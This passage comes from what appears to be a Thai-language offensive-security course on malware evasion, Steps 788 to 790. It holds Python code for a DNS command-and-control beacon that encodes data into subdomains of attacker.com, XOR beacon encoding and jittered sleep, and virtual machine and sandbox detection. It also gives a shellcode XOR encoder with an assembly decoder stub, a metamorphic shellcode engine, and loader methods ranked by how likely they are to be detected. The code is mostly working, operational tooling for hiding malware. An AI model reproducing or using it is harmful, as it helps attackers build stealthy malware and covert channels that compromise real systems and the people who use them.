            append ";";
            print;
        }
    }
}
"""
            },
            "hiding_methods": [
                "Beacon in HTTP headers (User-Agent, Cookie, Referer)",
                "Beacon in HTTP body mixed with legitimate content",
                "Use legitimate CDN URLs and parameters",
                "Mimic known applications (Slack, Teams, Dropbox traffic)"
            ]
        }
    
    def dns_c2(self) -> Dict:
        return {
            "technique": "DNS C2 Channel",
            "methods": [
                {
                    "name": "DNS TXT Records",
                    "description": "Encode commands in TXT record queries/responses"
                },
                {
                    "name": "DNS Tunneling",
                    "description": "Full bidirectional tunnel using DNS (dnscat2, iodine)"
                },
                {
                    "name": "Subdomain Exfil",
                    "description": "Encode data in subdomain: b64data.attacker.com"
                },
                {
                    "name": "Low and Slow",
                    "description": "One DNS query every 30 minutes to avoid detection"
                }
            ],
            "implementation_example": """
import dns.resolver
import base64

def dns_beacon(domain: str, data: bytes) -> str:
    # Encode data as subdomain labels (max 63 chars each, max 253 total)
    encoded = base64.b32encode(data).decode().rstrip('=').lower()
    
    # Split into 63-char chunks
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    query = '.'.join(chunks[:3]) + '.' + domain  # Limit to 3 chunks
    
    try:
        answers = dns.resolver.resolve(query, 'TXT')
        return str(answers[0]).strip('"')  # Command in TXT record
    except Exception:
        return None
"""
        }
    
    def https_c2_profile(self) -> Dict:
        return {
            "technique": "HTTPS C2 with Certificate Pinning Evasion",
            "cert_tips": [
                "Use Let's Encrypt certificates (trusted by default)",
                "Register domain 1+ month before use (avoid NXD detection)",
                "Use domains categorized as benign (parked, business)",
                "Implement legitimate-looking TLS handshake"
            ],
            "redirector_infrastructure": [
                "Apache mod_rewrite for conditional redirection",
                "Nginx with reverse proxy to actual C2",
                "Cloud function (Lambda) as redirector",
                "Compromised legitimate servers"
            ]
        }


@dataclass
class TrafficAnalysisEvasion:
    """Evade network traffic analysis"""
    
    def jitter_sleep(self, base_ms: int = 60000, jitter_pct: int = 30) -> float:
        """Calculate jittered sleep interval"""
        import random
        jitter = base_ms * jitter_pct / 100
        actual_sleep = base_ms + random.uniform(-jitter, jitter)
        return actual_sleep / 1000  # Return seconds
    
    def encode_payload(self, data: bytes, key: bytes = b'secretkey') -> bytes:
        """XOR encode C2 beacon data"""
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])
        return bytes(result)


if __name__ == '__main__':
    c2 = C2Evasion()
    print("Domain Fronting how it works:")
    for step in c2.domain_fronting()['how_it_works']:
        print(f"  {step}")
    
    print("\nDNS C2 methods:")
    for method in c2.dns_c2()['methods']:
        print(f"  - {method['name']}: {method['description']}")
    
    traffic = TrafficAnalysisEvasion()
    sleep = traffic.jitter_sleep(60000, 30)
    print(f"\nJittered sleep interval: {sleep:.2f}s")
```

## Step 789: Hypervisor-Level Evasion and VM Detection

การตรวจจับว่าอยู่ใน virtual machine และ hypervisor-based evasion

```python
from dataclasses import dataclass, field
from typing import Dict, List, Tuple
import time
import platform
import os

@dataclass
class VMDetection:
    """Virtual machine and sandbox detection techniques"""
    
    def cpuid_detection(self) -> Dict:
        return {
            "technique": "CPUID-based VM Detection",
            "method": "Execute CPUID instruction and examine results",
            "checks": [
                {
                    "leaf": "0x40000000",
                    "hypervisor_bit": "ECX bit 31 of CPUID(1) indicates hypervisor present",
                    "vendor": "CPUID(0x40000000).EBX/ECX/EDX returns hypervisor vendor string"
                },
                {
                    "vmware": "'VMwareVMware' in CPUID(0x40000000)",
                    "vbox": "'VBoxVBoxVBox' in CPUID(0x40000000)",
                    "hyperv": "'Microsoft Hv' in CPUID(0x40000000)",
                    "xen": "'XenVMMXenVMM' in CPUID(0x40000000)"
                }
            ],
            "python_check": """
# Check hypervisor using platform module
import platform
import subprocess

def check_hypervisor():
    # Check via WMI (Windows)
    if platform.system() == 'Windows':
        result = subprocess.run(
            ['wmic', 'computersystem', 'get', 'model'],
            capture_output=True, text=True
        )
        vm_strings = ['vmware', 'virtualbox', 'virtual', 'kvm', 'qemu', 'xen']
        return any(s in result.stdout.lower() for s in vm_strings)
    
    # Check /proc/cpuinfo on Linux
    elif platform.system() == 'Linux':
        try:
            with open('/proc/cpuinfo', 'r') as f:
                cpuinfo = f.read().lower()
            return any(s in cpuinfo for s in ['hypervisor', 'vmware', 'kvm'])
        except:
            return False
    return False
"""
        }
    
    def artifact_detection(self) -> Dict:
        return {
            "technique": "VM Artifact Detection",
            "windows_artifacts": {
                "processes": [
                    "vmtoolsd.exe (VMware Tools)",
                    "vmwaretray.exe (VMware)",
                    "vboxservice.exe (VirtualBox)",
                    "vboxtray.exe (VirtualBox)",
                    "vmsrvc.exe (Virtual PC)",
                    "vmusrvc.exe (Virtual PC)"
                ],
                "registry_keys": [
                    "HKLM\\SOFTWARE\\VMware, Inc.",
                    "HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
                    "HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX_"
                ],
                "files": [
                    "C:\\Windows\\System32\\drivers\\vmmouse.sys",
                    "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
                    "C:\\Program Files\\VMware",
                    "C:\\Program Files\\Oracle\\VirtualBox Guest Additions"
                ],
                "mac_addresses": [
                    "00:0C:29 (VMware)",
                    "00:50:56 (VMware)",
                    "08:00:27 (VirtualBox)",
                    "00:16:3E (Xen)"
                ]
            }
        }
    
    def timing_detection(self) -> Dict:
        return {
            "technique": "Timing-based VM Detection",
            "methods": [
                {
                    "name": "RDTSC delta",
                    "description": "RDTSC before/after CPUID - VMs have higher overhead",
                    "threshold": "Delta > 500-1000 cycles suggests VM"
                },
                {
                    "name": "RDTSC across context switch",
                    "description": "Context switches take longer in VMs"
                },
                {
                    "name": "Sleep accuracy",
                    "description": "Sandboxes accelerate time, sleep() returns early"
                },
                {
                    "name": "GetTickCount",
                    "description": "Compare GetTickCount before/after known operations"
                }
            ]
        }
    
    def run_detection(self) -> Dict:
        """Run available VM detection checks"""
        results = {}
        
        # Check process list (Linux/Mac)
        vm_processes = ['vmtoolsd', 'vboxservice', 'vmsrvc', 'vmwaretray']
        try:
            proc_list = os.popen('ps aux 2>/dev/null || tasklist 2>/dev/null').read().lower()
            results['vm_processes'] = [p for p in vm_processes if p in proc_list]
        except:
            results['vm_processes'] = []
        
        # Check environment
        results['in_ci'] = any(var in os.environ for var in 
                               ['CI', 'TRAVIS', 'GITHUB_ACTIONS', 'JENKINS_URL'])
        
        # Disk size check (sandboxes often have small disks)
        try:
            import shutil
            disk_gb = shutil.disk_usage('/').total / (1024**3)
            results['disk_gb'] = round(disk_gb, 1)
            results['small_disk'] = disk_gb < 60
        except:
            results['disk_gb'] = 'unknown'
        
        return results


if __name__ == '__main__':
    vm = VMDetection()
    
    print("VM Artifact Detection (Windows processes):")
    for proc in vm.artifact_detection()['windows_artifacts']['processes'][:3]:
        print(f"  {proc}")
    
    print("\nTiming-based detection:")
    for method in vm.timing_detection()['methods']:
        print(f"  - {method['name']}: {method['description']}")
    
    print("\nRunning detection checks:")
    results = vm.run_detection()
    for k, v in results.items():
        print(f"  {k}: {v}")
```

## Step 790: Custom Shellcode Development and Obfuscation

การสร้าง custom shellcode และ obfuscation เพื่อหลีกเลี่ยงการตรวจจับ

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
import struct
import os
import base64

@dataclass
class ShellcodeGenerator:
    """Custom shellcode development and obfuscation"""
    
    def assembly_primer(self) -> Dict:
        return {
            "shellcode_requirements": [
                "Position-independent code (PIC) - no absolute addresses",
                "No null bytes (strings terminate at \\x00)",
                "Small size",
                "No external dependencies (resolve APIs dynamically)"
            ],
            "common_techniques": [
                "Use call/pop to get current address",
                "Walk PEB to find kernel32.dll",
                "Use GetProcAddress to find API addresses",
                "Hash API names to avoid strings"
            ],
            "null_byte_removal": [
                "MOV EAX, 0 → XOR EAX, EAX",
                "MOV EAX, 1 → XOR EAX, EAX; INC EAX",
                "PUSH 0 → XOR EAX, EAX; PUSH EAX",
                "Use byte/word operations instead of dword when possible"
            ]
        }
    
    def generate_xor_encoder(self, shellcode: bytes, key: int = 0x41) -> Tuple[bytes, str]:
        """XOR encode shellcode with decoder stub"""
        encoded = bytes([b ^ key for b in shellcode])
        
        decoder_stub_template = f"""
; XOR Decoder Stub (key = 0x{key:02X})
; Size: ~20 bytes

cld                  ; clear direction flag
call next            ; push next instruction address
next:
    pop esi          ; esi = address of encoded shellcode
    lea edi, [esi+5] ; skip over stub length marker
    
decode_loop:
    lodsb            ; AL = [ESI], ESI++
    test al, al      ; check for end marker (0x00 after xor = 0x{key:02X} ^ 0x00 = 0x{key:02X})
    jz short done
    xor al, 0x{key:02X} ; decode byte
    stosb            ; store decoded byte, EDI++  
    jmp short decode_loop
    
done:
    jmp edi          ; jump to decoded shellcode
    
; Encoded shellcode follows...
"""
        return encoded, decoder_stub_template
    
    def polymorphic_shellcode(self) -> Dict:
        return {
            "technique": "Polymorphic Shellcode",
            "description": "Shellcode that changes its appearance while maintaining functionality",
            "methods": [
                {
                    "name": "Encryption + Decryptor",
                    "description": "Encrypt payload, decrypt at runtime with varying key"
                },
                {
                    "name": "Instruction substitution",
                    "description": "Equivalent instruction sequences (NOP sled variations, register swaps)"
                },
                {
                    "name": "Junk code insertion",
                    "description": "Add benign instructions between real instructions"
                },
                {
                    "name": "Code transposition",
                    "description": "Reorder independent code blocks with JMPs"
                }
            ]
        }
    
    def metamorphic_engine(self) -> str:
        return '''
# Metamorphic Engine Concept
# Disassemble -> Transform -> Reassemble

import capstone  # Disassembler
import keystone  # Assembler
import random

def metamorphic_transform(shellcode: bytes) -> bytes:
    """Transform shellcode to new functional equivalent"""
    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
    md.detail = True
    
    transformed_asm = []
    for insn in md.disasm(shellcode, 0x0):
        # Substitute MOV instructions with equivalent
        if insn.mnemonic == 'mov' and insn.op_str.startswith('eax'):
            reg_src = insn.op_str.split(', ')[1]
            # Replace MOV EAX, X with PUSH X; POP EAX
            transformed_asm.append(f'push {reg_src}')
            transformed_asm.append('pop eax')
        
        # Replace NOP with equivalent
        elif insn.mnemonic == 'nop':
            # Substitute NOP with PUSH/POP same register
            reg = random.choice(['eax', 'ebx', 'ecx', 'edx'])
            transformed_asm.append(f'push {reg}')
            transformed_asm.append(f'pop {reg}')
        
        else:
            transformed_asm.append(f'{insn.mnemonic} {insn.op_str}')
    
    # Reassemble
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    encoding, count = ks.asm('; '.join(transformed_asm))
    return bytes(encoding)
'''
    
    def shellcode_formats(self) -> Dict:
        """Different shellcode output formats"""
        sample = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'  # Snippet
        
        return {
            "c_array": ', '.join(f'0x{b:02x}' for b in sample),
            "python_bytes": ''.join(f'\\x{b:02x}' for b in sample),
            "base64": base64.b64encode(sample).decode(),
            "hex_string": sample.hex(),
            "vba_array": ', '.join(str(b) for b in sample)
        }


@dataclass
class ShellcodeLoader:
    """Shellcode loading techniques"""
    
    def loading_methods(self) -> List[Dict]:
        return [
            {
                "name": "VirtualAlloc + memcpy + cast to function",
                "language": "C",
                "detection_risk": "HIGH - classic loader pattern"
            },
            {
                "name": "CreateThread on shellcode buffer",
                "language": "C/C#",
                "detection_risk": "HIGH - very common"
            },
            {
                "name": "Fiber-based execution",
                "language": "C",
                "detection_risk": "MEDIUM - less common"
            },
            {
                "name": "Callback function (EnumWindows, CreateTimerQueueTimer)",
                "language": "C",
                "detection_risk": "MEDIUM - no direct thread creation"
            },
            {
                "name": ".NET delegates",
                "language": "C#",
                "detection_risk": "MEDIUM - bypass some .NET monitoring"
            },
            {
                "name": "VBA macro shellcode runner",
                "language": "VBA",
                "detection_risk": "HIGH but common for initial access"
            }
        ]


if __name__ == '__main__':
    gen = ShellcodeGenerator()
    
    print("Shellcode null byte removal:")
    for fix in gen.assembly_primer()['null_byte_removal']:
        print(f"  {fix}")
    
    sample_sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'
    encoded, stub = gen.generate_xor_encoder(sample_sc, 0x55)
    print(f"\nXOR encoded (key=0x55): {encoded.hex()}")
    
    formats = gen.shellcode_formats()
    print(f"\nPython format: {formats['python_bytes']}")
    print(f"Base64: {formats['base64']}")
    
    loader = ShellcodeLoader()
    print("\nLoading methods risk:")
    for method in loader.loading_methods():
        print(f"  [{method['detection_risk']}] {method['name']}")
```

---

## สรุป Part 79

| Step | หัวข้อ | เทคนิคสำคัญ |
|------|--------|-------------|
| 781 | Early Bird APC | Inject before main thread, CREATE_SUSPENDED |
| 782 | PPID Spoofing | Fake parent PID, PEB manipulation |
| 783 | API Hammering | Exhaust sandbox timeout, timing checks |
| 784 | ETW Patching | Patch EtwEventWrite, blind security tools |
| 785 | Fileless Malware | LOLBAS, PowerShell cradles, WMI persistence |
| 786 | Code Cave | PE backdooring, null byte injection |
| 787 | Heaven's Gate | WoW64 abuse, direct 64-bit syscalls |
| 788 | C2 Evasion | Domain fronting, DNS C2, malleable profiles |
| 789 | VM Detection | CPUID, artifacts, timing fingerprint |
| 790 | Shellcode Dev | Encoding, polymorphic, metamorphic, loaders |
